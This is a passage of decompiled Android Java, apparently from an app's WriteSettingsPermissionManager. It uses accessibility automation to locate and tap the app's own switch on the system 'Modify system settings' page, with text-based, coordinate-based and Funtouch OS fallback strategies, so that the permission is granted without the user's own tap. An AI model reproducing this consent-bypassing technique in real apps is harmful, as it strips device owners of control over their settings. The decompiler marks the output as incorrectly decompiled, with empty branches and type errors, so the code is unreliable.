                displayMetrics3 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2;
                str2 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1;
                c0327b25 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                string = str2;
                i = i8;
                i3 = i7;
                zM213652a5 = z2;
                c0327b2 = c0327b25;
                i2 = i6;
                displayMetrics = displayMetrics3;
                if (i3 <= i2) {
                }
                return Boolean.FALSE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:100:0x0173 A[Catch: Exception -> 0x0034, TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:102:0x017b A[Catch: Exception -> 0x0034, TRY_LEAVE, TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:47:0x0081 A[Catch: Exception -> 0x0059, TryCatch #1 {Exception -> 0x0059, blocks: (B:30:0x0055, B:59:0x00ae, B:61:0x00b6, B:63:0x00b9, B:65:0x00c1, B:67:0x00c4, B:69:0x00ce, B:71:0x00e3, B:73:0x00e9, B:91:0x0140, B:93:0x0146, B:35:0x005f, B:52:0x0096, B:54:0x009e, B:56:0x00a1, B:38:0x0065, B:45:0x0079, B:47:0x0081, B:49:0x0089), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:49:0x0089 A[Catch: Exception -> 0x0059, TryCatch #1 {Exception -> 0x0059, blocks: (B:30:0x0055, B:59:0x00ae, B:61:0x00b6, B:63:0x00b9, B:65:0x00c1, B:67:0x00c4, B:69:0x00ce, B:71:0x00e3, B:73:0x00e9, B:91:0x0140, B:93:0x0146, B:35:0x005f, B:52:0x0096, B:54:0x009e, B:56:0x00a1, B:38:0x0065, B:45:0x0079, B:47:0x0081, B:49:0x0089), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:54:0x009e A[Catch: Exception -> 0x0059, TryCatch #1 {Exception -> 0x0059, blocks: (B:30:0x0055, B:59:0x00ae, B:61:0x00b6, B:63:0x00b9, B:65:0x00c1, B:67:0x00c4, B:69:0x00ce, B:71:0x00e3, B:73:0x00e9, B:91:0x0140, B:93:0x0146, B:35:0x005f, B:52:0x0096, B:54:0x009e, B:56:0x00a1, B:38:0x0065, B:45:0x0079, B:47:0x0081, B:49:0x0089), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00a1 A[Catch: Exception -> 0x0059, TryCatch #1 {Exception -> 0x0059, blocks: (B:30:0x0055, B:59:0x00ae, B:61:0x00b6, B:63:0x00b9, B:65:0x00c1, B:67:0x00c4, B:69:0x00ce, B:71:0x00e3, B:73:0x00e9, B:91:0x0140, B:93:0x0146, B:35:0x005f, B:52:0x0096, B:54:0x009e, B:56:0x00a1, B:38:0x0065, B:45:0x0079, B:47:0x0081, B:49:0x0089), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x00b6 A[Catch: Exception -> 0x0059, TryCatch #1 {Exception -> 0x0059, blocks: (B:30:0x0055, B:59:0x00ae, B:61:0x00b6, B:63:0x00b9, B:65:0x00c1, B:67:0x00c4, B:69:0x00ce, B:71:0x00e3, B:73:0x00e9, B:91:0x0140, B:93:0x0146, B:35:0x005f, B:52:0x0096, B:54:0x009e, B:56:0x00a1, B:38:0x0065, B:45:0x0079, B:47:0x0081, B:49:0x0089), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x00b9 A[Catch: Exception -> 0x0059, TryCatch #1 {Exception -> 0x0059, blocks: (B:30:0x0055, B:59:0x00ae, B:61:0x00b6, B:63:0x00b9, B:65:0x00c1, B:67:0x00c4, B:69:0x00ce, B:71:0x00e3, B:73:0x00e9, B:91:0x0140, B:93:0x0146, B:35:0x005f, B:52:0x0096, B:54:0x009e, B:56:0x00a1, B:38:0x0065, B:45:0x0079, B:47:0x0081, B:49:0x0089), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x010e  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0110 A[Catch: Exception -> 0x0034, PHI: r0
      0x0110: PHI (r0v13 com.storm.safe.rock.service.modules.b2) = (r0v11 com.storm.safe.rock.service.modules.b2), (r0v14 com.storm.safe.rock.service.modules.b2) binds: [B:78:0x010c, B:24:0x0047] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:82:0x0116 A[Catch: Exception -> 0x0034, TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0134 A[Catch: Exception -> 0x0034, TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x013a A[Catch: Exception -> 0x0034, TRY_LEAVE, TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x016a  */
    /* JADX WARN: Removed duplicated region for block: B:98:0x016b A[Catch: Exception -> 0x0034, PHI: r0 r9
      0x016b: PHI (r0v18 com.storm.safe.rock.service.modules.b2) = (r0v15 com.storm.safe.rock.service.modules.b2), (r0v19 com.storm.safe.rock.service.modules.b2) binds: [B:96:0x0168, B:18:0x0039] A[DONT_GENERATE, DONT_INLINE]
      0x016b: PHI (r9v54 java.lang.Object) = (r9v50 java.lang.Object), (r9v1 java.lang.Object) binds: [B:96:0x0168, B:18:0x0039] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0034, blocks: (B:13:0x0030, B:18:0x0039, B:98:0x016b, B:100:0x0173, B:102:0x017b, B:21:0x0040, B:85:0x012e, B:87:0x0134, B:89:0x013a, B:95:0x015f, B:24:0x0047, B:80:0x0110, B:82:0x0116, B:27:0x004e, B:77:0x0101), top: B:116:0x0023 }] */
    /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* JADX WARN: Type inference failed for: r3v0, types: [int] */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211714a3(ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$attemptCoordinateClick$1 writeSettingsPermissionManager$attemptCoordinateClick$1;
        C0327b2 c0327b2;
        C0327b2 c0327b22;
        C0327b2 c0327b23 = "⚠️ [开关检测] 有";
        if (continuationImpl instanceof WriteSettingsPermissionManager$attemptCoordinateClick$1) {
            writeSettingsPermissionManager$attemptCoordinateClick$1 = (WriteSettingsPermissionManager$attemptCoordinateClick$1) continuationImpl;
            int i = writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = i - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$attemptCoordinateClick$1 = new WriteSettingsPermissionManager$attemptCoordinateClick$1(this, continuationImpl);
            }
        }
        Object objM211720b2 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52914a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        ?? r3 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3;
        try {
            try {
                switch (r3) {
                    case 0:
                        kg1.m213544f4(objM211720b2);
                        try {
                            writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = this;
                            writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 1;
                            objM211720b2 = m211720b2(writeSettingsPermissionManager$attemptCoordinateClick$1);
                            if (objM211720b2 != coroutineSingletons) {
                                c0327b2 = this;
                                if (((Boolean) objM211720b2).booleanValue()) {
                                    t60.m214726f4("WriteSettingsPerm", "⚠️ 无法进入修改系统设置页面，跳过点击");
                                    return Boolean.FALSE;
                                }
                                writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b2;
                                writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 2;
                                objM211720b2 = c0327b2.m211718a7(writeSettingsPermissionManager$attemptCoordinateClick$1);
                                if (objM211720b2 != coroutineSingletons) {
                                    if (!((Boolean) objM211720b2).booleanValue()) {
                                        return Boolean.TRUE;
                                    }
                                    writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b2;
                                    writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 3;
                                    objM211720b2 = c0327b2.m211713a2(writeSettingsPermissionManager$attemptCoordinateClick$1);
                                    if (objM211720b2 != coroutineSingletons) {
                                        if (!((Boolean) objM211720b2).booleanValue()) {
                                            return Boolean.TRUE;
                                        }
                                        AccessibilityNodeInfo rootInActiveWindow = c0327b2.f53166a0.getRootInActiveWindow();
                                        if (rootInActiveWindow == null) {
                                            return Boolean.FALSE;
                                        }
                                        ArrayList arrayListM211699b7 = m211699b7(rootInActiveWindow);
                                        if (arrayListM211699b7.size() == 1) {
                                            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) arrayListM211699b7.get(0);
                                            Rect rect = new Rect();
                                            accessibilityNodeInfo.getBoundsInScreen(rect);
                                            if (accessibilityNodeInfo.isChecked()) {
                                                c0327b2.m211738e3();
                                                return Boolean.TRUE;
                                            }
                                            float fCenterX = rect.centerX();
                                            float fCenterY = rect.centerY();
                                            writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b2;
                                            writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 4;
                                            if (c0327b2.m211747f2(fCenterX, fCenterY, writeSettingsPermissionManager$attemptCoordinateClick$1) != coroutineSingletons) {
                                                c0327b22 = c0327b2;
                                                writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b22;
                                                writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 5;
                                                if (b81.m210571b1(800L, writeSettingsPermissionManager$attemptCoordinateClick$1) == coroutineSingletons) {
                                                    if (!c0327b22.m211737d9()) {
                                                        t60.m214726f4("WriteSettingsPerm", "⚠️ [开关点击] 页面跳走了，尝试返回");
                                                        c0327b22.f53166a0.performGlobalAction(1);
                                                        writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b22;
                                                        writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 6;
                                                        if (b81.m210571b1(500L, writeSettingsPermissionManager$attemptCoordinateClick$1) == coroutineSingletons) {
                                                        }
                                                    }
                                                    if (c0327b22.m211734d5()) {
                                                        c0327b22.m211738e3();
                                                        return Boolean.TRUE;
                                                    }
                                                    t60.m214726f4("WriteSettingsPerm", "⚠️ [开关点击] 点击后权限未变化，执行备用方案");
                                                    writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b22;
                                                    writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 7;
                                                    objM211720b2 = c0327b22.m211720b2(writeSettingsPermissionManager$attemptCoordinateClick$1);
                                                    if (objM211720b2 == coroutineSingletons) {
                                                        if (((Boolean) objM211720b2).booleanValue()) {
                                                            t60.m214726f4("WriteSettingsPerm", "⚠️ [备用方案] 无法进入修改系统设置页面，跳过");
                                                            return Boolean.FALSE;
                                                        }
                                                        writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b22;
                                                        writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 8;
                                                        Object objM211716a5 = c0327b22.m211716a5(writeSettingsPermissionManager$attemptCoordinateClick$1);
                                                        if (objM211716a5 != coroutineSingletons) {
                                                            return objM211716a5;
                                                        }
                                                    }
                                                }
                                            }
                                        } else {
                                            if (arrayListM211699b7.size() > 1) {
                                                t60.m214726f4("WriteSettingsPerm", "⚠️ [开关检测] 有" + arrayListM211699b7.size() + "个开关，无法确定哪个是我们的应用，跳过直接点击");
                                            }
                                            c0327b22 = c0327b2;
                                            writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b22;
                                            writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 7;
                                            objM211720b2 = c0327b22.m211720b2(writeSettingsPermissionManager$attemptCoordinateClick$1);
                                            if (objM211720b2 == coroutineSingletons) {
                                            }
                                        }
                                    }
                                }
                            }
                            return coroutineSingletons;
                        } catch (Exception e) {
                            e = e;
                            c0327b23 = this;
                            if (!t60.m214686a2(e.getMessage(), "TEXT_SEARCH_FAILED_REPEATEDLY")) {
                                t60.m214705c6("WriteSettingsPerm", "❌ 点击方案执行异常", e);
                                return Boolean.FALSE;
                            }
                            t60.m214726f4("WriteSettingsPerm", "⚠️ 文本搜索重复失败，立即切换到智能检测策略");
                            c0327b23.f53176b0 = WriteSettingsPermissionManager$DeviceStrategy.f52896a1;
                            c0327b23.m211750f6();
                            return Boolean.TRUE;
                        }
                    case 1:
                        c0327b2 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        if (((Boolean) objM211720b2).booleanValue()) {
                        }
                        break;
                    case 2:
                        c0327b2 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        if (!((Boolean) objM211720b2).booleanValue()) {
                        }
                        break;
                    case 3:
                        c0327b2 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        if (!((Boolean) objM211720b2).booleanValue()) {
                        }
                        break;
                    case 4:
                        c0327b22 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0 = c0327b22;
                        writeSettingsPermissionManager$attemptCoordinateClick$1.f52916a3 = 5;
                        if (b81.m210571b1(800L, writeSettingsPermissionManager$attemptCoordinateClick$1) == coroutineSingletons) {
                        }
                        return coroutineSingletons;
                    case 5:
                        c0327b22 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        if (!c0327b22.m211737d9()) {
                        }
                        if (c0327b22.m211734d5()) {
                        }
                        break;
                    case 6:
                        c0327b22 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        if (c0327b22.m211734d5()) {
                        }
                        break;
                    case 7:
                        c0327b22 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        if (((Boolean) objM211720b2).booleanValue()) {
                        }
                        break;
                    case 8:
                        C0327b2 c0327b24 = writeSettingsPermissionManager$attemptCoordinateClick$1.f52913a0;
                        kg1.m213544f4(objM211720b2);
                        return objM211720b2;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            } catch (Exception e2) {
                e = e2;
                c0327b23 = r3;
            }
        } catch (Exception e3) {
            e = e3;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:47:0x00d2, code lost:
    
        if (p000.b81.m210571b1(800, r0) == r1) goto L63;
     */
    /* JADX WARN: Code restructure failed: missing block: B:62:0x011b, code lost:
    
        if (p000.b81.m210571b1(800, r0) == r1) goto L63;
     */
    /* JADX WARN: Removed duplicated region for block: B:59:0x010b A[PHI: r14 r15
      0x010b: PHI (r14v12 com.storm.safe.rock.service.modules.b2) = (r14v7 com.storm.safe.rock.service.modules.b2), (r14v20 com.storm.safe.rock.service.modules.b2) binds: [B:57:0x0108, B:17:0x003d] A[DONT_GENERATE, DONT_INLINE]
      0x010b: PHI (r15v20 java.lang.Object) = (r15v14 java.lang.Object), (r15v1 java.lang.Object) binds: [B:57:0x0108, B:17:0x003d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0113  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0130  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211715a4(AccessibilityNodeInfo accessibilityNodeInfo, ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$attemptOldFuntouchOSClick$1 writeSettingsPermissionManager$attemptOldFuntouchOSClick$1;
        C0327b2 c0327b2;
        if (continuationImpl instanceof WriteSettingsPermissionManager$attemptOldFuntouchOSClick$1) {
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1 = (WriteSettingsPermissionManager$attemptOldFuntouchOSClick$1) continuationImpl;
            int i = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3 = i - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$attemptOldFuntouchOSClick$1 = new WriteSettingsPermissionManager$attemptOldFuntouchOSClick$1(this, continuationImpl);
            }
        }
        Object objM211747f2 = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52918a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3;
        if (i2 == 0) {
            kg1.m213544f4(objM211747f2);
            Iterator it = dh0.f55771c1.iterator();
            AccessibilityNodeInfo accessibilityNodeInfo2 = null;
            while (it.hasNext()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) it.next());
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    Iterator<AccessibilityNodeInfo> it2 = listFindAccessibilityNodeInfosByText.iterator();
                    while (true) {
                        if (!it2.hasNext()) {
                            break;
                        }
                        AccessibilityNodeInfo next = it2.next();
                        if (next.isVisibleToUser() && AbstractC0003a2.m24a5(next).top > 240) {
                            accessibilityNodeInfo2 = next;
                            break;
                        }
                    }
                }
                if (accessibilityNodeInfo2 != null) {
                    break;
                }
            }
            if (accessibilityNodeInfo2 != null) {
                Rect rect = new Rect();
                accessibilityNodeInfo2.getBoundsInScreen(rect);
                AccessibilityNodeInfo accessibilityNodeInfoM211702c7 = m211702c7(accessibilityNodeInfo, rect);
                if (accessibilityNodeInfoM211702c7 != null) {
                    Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM211702c7);
                    float fCenterX = rectM24a5.centerX();
                    float fCenterY = rectM24a5.centerY();
                    writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0 = this;
                    writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3 = 1;
                    objM211747f2 = m211747f2(fCenterX, fCenterY, writeSettingsPermissionManager$attemptOldFuntouchOSClick$1);
                    if (objM211747f2 != coroutineSingletons) {
                        c0327b2 = this;
                    }
                    return coroutineSingletons;
                }
            }
            c0327b2 = this;
            DisplayMetrics displayMetrics = c0327b2.f53167a1.getResources().getDisplayMetrics();
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0 = c0327b2;
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3 = 3;
            objM211747f2 = c0327b2.m211747f2(displayMetrics.widthPixels * 0.9f, displayMetrics.heightPixels * 0.22f, writeSettingsPermissionManager$attemptOldFuntouchOSClick$1);
            if (objM211747f2 != coroutineSingletons) {
                if (((Boolean) objM211747f2).booleanValue()) {
                }
            }
            return coroutineSingletons;
        }
        if (i2 == 1) {
            c0327b2 = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0;
            kg1.m213544f4(objM211747f2);
        } else {
            if (i2 == 2) {
                c0327b2 = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0;
                kg1.m213544f4(objM211747f2);
                if (c0327b2.m211734d5()) {
                    c0327b2.m211738e3();
                    return Boolean.TRUE;
                }
                c0327b2.m211738e3();
                return Boolean.TRUE;
            }
            if (i2 != 3) {
                if (i2 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                c0327b2 = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0;
                kg1.m213544f4(objM211747f2);
                if (c0327b2.m211734d5()) {
                    c0327b2.m211738e3();
                    return Boolean.TRUE;
                }
                c0327b2.m211738e3();
                return Boolean.TRUE;
            }
            c0327b2 = writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0;
            kg1.m213544f4(objM211747f2);
            if (((Boolean) objM211747f2).booleanValue()) {
                t60.m214726f4("WriteSettingsPerm", "❌ [老版本Funtouch] 所有方案都失败");
                return Boolean.FALSE;
            }
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0 = c0327b2;
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3 = 4;
        }
        if (((Boolean) objM211747f2).booleanValue()) {
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0 = c0327b2;
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3 = 2;
        } else {
            DisplayMetrics displayMetrics2 = c0327b2.f53167a1.getResources().getDisplayMetrics();
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52917a0 = c0327b2;
            writeSettingsPermissionManager$attemptOldFuntouchOSClick$1.f52920a3 = 3;
            objM211747f2 = c0327b2.m211747f2(displayMetrics2.widthPixels * 0.9f, displayMetrics2.heightPixels * 0.22f, writeSettingsPermissionManager$attemptOldFuntouchOSClick$1);
            if (objM211747f2 != coroutineSingletons) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Code restructure failed: missing block: B:85:0x0355, code lost:
    
        if (p000.b81.m210571b1(500, r2) == r3) goto L86;
     */
    /* JADX WARN: Code restructure failed: missing block: B:95:0x02d1, code lost:
    
        p000.t60.m214726f4("WriteSettingsPerm", "⚠️ 计算出的坐标无效: (" + r9 + ", " + r0 + ")");
        r2 = r2;
     */
    /* JADX WARN: Removed duplicated region for block: B:57:0x0278 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:14:0x0045, B:89:0x038b, B:57:0x0278, B:61:0x0294, B:64:0x02b0, B:66:0x02b8, B:68:0x02d5, B:71:0x02ef, B:73:0x02f5, B:75:0x0307, B:77:0x030f, B:79:0x0315, B:82:0x031c, B:84:0x0322, B:88:0x0366, B:90:0x0391, B:21:0x0065, B:24:0x0086, B:27:0x0090, B:29:0x0098, B:31:0x00a0, B:32:0x00a7, B:34:0x00ae, B:36:0x00ba, B:38:0x00be, B:40:0x00e4, B:42:0x00e7, B:43:0x0109, B:44:0x010a, B:46:0x0118, B:48:0x0126, B:50:0x025c, B:52:0x0262, B:55:0x0269), top: B:94:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:66:0x02b8 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:14:0x0045, B:89:0x038b, B:57:0x0278, B:61:0x0294, B:64:0x02b0, B:66:0x02b8, B:68:0x02d5, B:71:0x02ef, B:73:0x02f5, B:75:0x0307, B:77:0x030f, B:79:0x0315, B:82:0x031c, B:84:0x0322, B:88:0x0366, B:90:0x0391, B:21:0x0065, B:24:0x0086, B:27:0x0090, B:29:0x0098, B:31:0x00a0, B:32:0x00a7, B:34:0x00ae, B:36:0x00ba, B:38:0x00be, B:40:0x00e4, B:42:0x00e7, B:43:0x0109, B:44:0x010a, B:46:0x0118, B:48:0x0126, B:50:0x025c, B:52:0x0262, B:55:0x0269), top: B:94:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:68:0x02d5 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:14:0x0045, B:89:0x038b, B:57:0x0278, B:61:0x0294, B:64:0x02b0, B:66:0x02b8, B:68:0x02d5, B:71:0x02ef, B:73:0x02f5, B:75:0x0307, B:77:0x030f, B:79:0x0315, B:82:0x031c, B:84:0x0322, B:88:0x0366, B:90:0x0391, B:21:0x0065, B:24:0x0086, B:27:0x0090, B:29:0x0098, B:31:0x00a0, B:32:0x00a7, B:34:0x00ae, B:36:0x00ba, B:38:0x00be, B:40:0x00e4, B:42:0x00e7, B:43:0x0109, B:44:0x010a, B:46:0x0118, B:48:0x0126, B:50:0x025c, B:52:0x0262, B:55:0x0269), top: B:94:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:73:0x02f5 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:14:0x0045, B:89:0x038b, B:57:0x0278, B:61:0x0294, B:64:0x02b0, B:66:0x02b8, B:68:0x02d5, B:71:0x02ef, B:73:0x02f5, B:75:0x0307, B:77:0x030f, B:79:0x0315, B:82:0x031c, B:84:0x0322, B:88:0x0366, B:90:0x0391, B:21:0x0065, B:24:0x0086, B:27:0x0090, B:29:0x0098, B:31:0x00a0, B:32:0x00a7, B:34:0x00ae, B:36:0x00ba, B:38:0x00be, B:40:0x00e4, B:42:0x00e7, B:43:0x0109, B:44:0x010a, B:46:0x0118, B:48:0x0126, B:50:0x025c, B:52:0x0262, B:55:0x0269), top: B:94:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x0307 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:14:0x0045, B:89:0x038b, B:57:0x0278, B:61:0x0294, B:64:0x02b0, B:66:0x02b8, B:68:0x02d5, B:71:0x02ef, B:73:0x02f5, B:75:0x0307, B:77:0x030f, B:79:0x0315, B:82:0x031c, B:84:0x0322, B:88:0x0366, B:90:0x0391, B:21:0x0065, B:24:0x0086, B:27:0x0090, B:29:0x0098, B:31:0x00a0, B:32:0x00a7, B:34:0x00ae, B:36:0x00ba, B:38:0x00be, B:40:0x00e4, B:42:0x00e7, B:43:0x0109, B:44:0x010a, B:46:0x0118, B:48:0x0126, B:50:0x025c, B:52:0x0262, B:55:0x0269), top: B:94:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0391 A[Catch: Exception -> 0x004a, TRY_LEAVE, TryCatch #0 {Exception -> 0x004a, blocks: (B:14:0x0045, B:89:0x038b, B:57:0x0278, B:61:0x0294, B:64:0x02b0, B:66:0x02b8, B:68:0x02d5, B:71:0x02ef, B:73:0x02f5, B:75:0x0307, B:77:0x030f, B:79:0x0315, B:82:0x031c, B:84:0x0322, B:88:0x0366, B:90:0x0391, B:21:0x0065, B:24:0x0086, B:27:0x0090, B:29:0x0098, B:31:0x00a0, B:32:0x00a7, B:34:0x00ae, B:36:0x00ba, B:38:0x00be, B:40:0x00e4, B:42:0x00e7, B:43:0x0109, B:44:0x010a, B:46:0x0118, B:48:0x0126, B:50:0x025c, B:52:0x0262, B:55:0x0269), top: B:94:0x002d }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:66:0x02b8 -> B:67:0x02d1). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:83:0x0320 -> B:87:0x0358). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:85:0x0355 -> B:87:0x0358). Please report as a decompilation issue!!! */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211716a5(ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$attemptTextBasedClick$1 writeSettingsPermissionManager$attemptTextBasedClick$1;
        int i;
        String string;
        int size;
        List list;
        C0327b2 c0327b2;
        String str;
        AccessibilityNodeInfo accessibilityNodeInfo;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        int i2;
        CharSequence packageName;
        int i3;
